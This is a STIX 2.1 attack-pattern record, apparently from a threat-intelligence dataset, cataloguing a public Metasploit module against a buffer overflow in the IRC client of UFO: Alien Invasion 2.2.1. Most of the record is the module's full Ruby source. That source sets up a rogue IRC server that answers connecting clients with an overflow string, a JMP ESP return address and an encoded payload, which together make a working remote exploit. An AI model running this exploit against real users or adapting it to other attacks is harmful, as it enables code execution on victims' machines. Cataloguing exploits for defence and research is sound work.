{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--72e1f7cf-a151-4499-a9ba-6154716586f0",
    "created": "2024-08-14T16:45:34.41517Z",
    "modified": "2024-08-14T16:45:34.415174Z",
    "name": "UFO: Alien Invasion IRC Client Buffer Overflow",
    "description": " This module exploits a buffer overflow in the IRC client component of UFO: Alien Invasion 2.2.1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ufo_ai.rb",
            "external_id": "ufo_ai.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'UFO: Alien Invasion IRC Client Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the IRC client component of\n        UFO: Alien Invasion 2.2.1.\n      },\n      'Author' \t =>\n        [\n          'Jason Geffner',  # Original Windows PoC Author\n          'dookie'          # MSF Module Author\n        ],\n      'License'  => MSF_LICENSE,\n      'References' =>\n        [\n          [ 'OSVDB', '65689'],\n          [ 'EDB', '14013' ]\n        ],\n      'Payload' =>\n        {\n          'Space' => 400,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'MaxNops' => 0,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP Universal', { 'Ret' => 0x0AE59A43 } ], # JMP ESP in SDL_ttf.dll\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-10-28'))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The IRC daemon port to listen on\", 6667 ]),\n      ])\n\n  end\n\n  def on_client_connect(client)\n\n    return if ((p = regenerate_payload(client)) == nil)\n\n    print_status(\"Got client connection...\")\n\n    buffer = \"001 :\"\n    buffer << rand_text_alpha_upper(552)\n    buffer << [ target.ret ].pack('V')\n    buffer << make_nops(8)\n    buffer << payload.encoded\n    buffer << \"\\x0d\\x0a\"\n\n    print_status(\"Sending exploit to #{client.peerhost}:#{client.peerport}...\")\n\n    client.put(buffer)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-28",
    "x_mitre_platforms": [
        "win'"
    ]
}